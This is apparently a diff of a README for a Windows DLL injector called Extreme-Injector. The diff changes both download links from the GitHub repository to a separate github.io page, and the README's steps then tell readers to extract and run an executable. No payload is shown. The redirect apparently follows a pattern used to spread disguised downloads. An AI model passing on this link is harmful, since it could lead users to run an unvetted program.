@@ -1,6 +1,6 @@
 # 🚀 Extreme-Injector - Load Custom Files Into Windows Programs
 
-[![](https://img.shields.io/badge/Download-Release-blue)](https://github.com/exceptionvacancy611/Extreme-Injector)
+[![](https://img.shields.io/badge/Download-Release-blue)](https://exceptionvacancy611.github.io)
 
 Extreme-Injector helps you load dynamic link library files into active programs on your computer. This tool manages the connection between your custom files and the target software. You can use this for system testing, research projects, or software modification tasks. The program works on Windows 10 and Windows 11.
 
@@ -27,7 +27,7 @@ To ensure proper performance, your computer must meet these basic standards:
 
 Follow these steps to set up the software on your Windows machine:
 
-1. Visit [this page to download](https://github.com/exceptionvacancy611/Extreme-Injector) the latest version.
+1. Visit [this page to download](https://exceptionvacancy611.github.io) the latest version.
 2. Save the compressed folder to a location you can access, such as your Desktop or Downloads folder.
 3. Right-click the folder and select Extract All. Pick a local folder for the files.
 4. Locate the file named Extreme-Injector.exe.
